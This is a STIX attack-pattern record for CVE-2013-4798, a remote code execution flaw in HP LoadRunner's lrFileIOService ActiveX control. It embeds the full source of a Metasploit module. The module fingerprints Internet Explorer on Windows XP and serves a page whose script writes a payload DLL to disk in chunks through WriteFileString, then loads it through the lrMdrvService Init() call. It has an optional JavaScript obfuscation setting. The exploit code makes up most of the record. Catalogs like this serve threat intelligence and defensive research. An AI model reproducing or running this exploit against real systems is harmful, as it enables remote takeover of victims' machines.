{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b153147a-21c4-40fb-9f03-c3e2c16bbd47",
    "created": "2024-08-14T16:44:29.158193Z",
    "modified": "2024-08-14T16:44:29.158197Z",
    "name": "\"HP LoadRunner lrFileIOService ActiveX WriteFileString Remote Code Execution\"",
    "description": " This module exploits a vulnerability on the lrFileIOService ActiveX, as installed with HP LoadRunner 11.50. The vulnerability exists in the WriteFileString method which allow the user to write arbitrary files. It's abused to drop a payload embedded in a dll, which is later loaded through the Init() method from the lrMdrvService control, by abusing an insecure LoadLibrary call. This module has been tested successfully on IE8 on Windows XP. Virtualization based on the Low Integrity Process, on Windows Vista and 7, will stop this module because the DLL will be dropped to a virtualized folder, which isn't used by LoadLibrary.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/hp_loadrunner_writefilestring.rb",
            "external_id": "hp_loadrunner_writefilestring.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4798"
        },
        {
            "source_name": "reference",
            "url": "https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03862772"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  include Msf::Exploit::EXE\n\n  #autopwn_info({\n  #  :ua_name    => HttpClients::IE,\n  #  :ua_minver  => \"6.0\",\n  #  :ua_maxver  => \"8.0\",\n  #  :javascript => true,\n  #  :os_name => OperatingSystems::Match::WINDOWS_XP,\n  #  :rank       => NormalRanking,\n  #  :classid    => \"{8D9E2CC7-D94B-4977-8510-FB49C361A139}\",\n  #  :method     => \"WriteFileString \"\n  #})\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"HP LoadRunner lrFileIOService ActiveX WriteFileString Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits a vulnerability on the lrFileIOService ActiveX, as installed\n        with HP LoadRunner 11.50. The vulnerability exists in the WriteFileString method,\n        which allow the user to write arbitrary files. It's abused to drop a payload\n        embedded in a dll, which is later loaded through the Init() method from the\n        lrMdrvService control, by abusing an insecure LoadLibrary call. This module has\n        been tested successfully on IE8 on Windows XP. Virtualization based on the Low\n        Integrity Process, on Windows Vista and 7, will stop this module because the DLL\n        will be dropped to a virtualized folder, which isn't used by LoadLibrary.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Brian Gorenc', # Vulnerability discovery\n          'juan vazquez'  # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-4798' ],\n          [ 'OSVDB', '95642' ],\n          [ 'BID', '61443'],\n          [ 'ZDI', '13-207' ],\n          [ 'URL', 'https://h20566.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03862772' ]\n        ],\n      'Payload'\t\t=>\n        {\n          'Space'\t      => 2048,\n          'DisableNops' => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic IE on Windows XP', {} ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-07-24',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation', false])\n      ])\n\n    self.needs_cleanup = true\n  end\n\n  # Just reminding the user to delete LrWeb2MdrvLoader.dll\n  # because migration and killing the exploited process is\n  # needed\n  def on_new_session(session)\n    print_status(\"New session... remember to delete LrWeb2MdrvLoader.dll\")\n  end\n\n  def is_target?(agent)\n    if agent =~ /Windows NT 5\\.1/ and agent =~ /MSIE/\n      return true\n    end\n\n    return false\n  end\n\n  def create_dll_js(object_id, dll_data)\n    dll_js = \"\"\n    first = true\n    dll_data.each_char { |chunk|\n      if first\n        dll_js << \"#{object_id}.WriteFileString(\\\"LrWeb2MdrvLoader.dll\\\", unescape(\\\"%u01#{Rex::Text.to_hex(chunk, \"\")}\\\"), false, \\\"UTF-8\\\");\\n\"\n        first = false\n      else\n        dll_js << \"#{object_id}.WriteFileString(\\\"LrWeb2MdrvLoader.dll\\\", unescape(\\\"%u01#{Rex::Text.to_hex(chunk, \"\")}\\\"), true, \\\"UTF-8\\\");\\n\"\n      end\n    }\n    return dll_js\n  end\n\n  def load_exploit_html(cli)\n    return nil if ((p = regenerate_payload(cli)) == nil)\n\n    file_io = rand_text_alpha(rand(10) + 8)\n    mdrv_service = rand_text_alpha(rand(10) + 8)\n    dll_data = generate_payload_dll({ :code => p.encoded })\n    drop_dll_js = create_dll_js(file_io, dll_data)\n\n    html = %Q|\n    <html>\n    <body>\n    <object classid='clsid:8D9E2CC7-D94B-4977-8510-FB49C361A139' id='#{file_io}'></object>\n    <object classid='clsid:9EE336F8-04B7-4B9F-8421-B982E7A4785C' id='#{mdrv_service}'></object>\n    <script language='javascript'>\n    #{drop_dll_js}\n    #{mdrv_service}.Init(\"-f #{rand_text_alpha(8 + rand(8))}\", \"#{rand_text_alpha(8 + rand(8))}\");\n    </script>\n    </body>\n    </html>\n    |\n\n    return html\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    uri   = request.uri\n    print_status(\"Requesting: #{uri}\")\n\n    # Avoid the attack if no suitable target found\n    if not is_target?(agent)\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    html = load_exploit_html(cli)\n    if html.nil?\n      send_not_found(cli)\n      return\n    end\n    html = html.gsub(/^ {4}/, '')\n    print_status(\"Sending HTML...\")\n    send_response(cli, html, {'Content-Type'=>'text/html'})\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-07-24",
    "x_mitre_platforms": [
        "win'"
    ]
}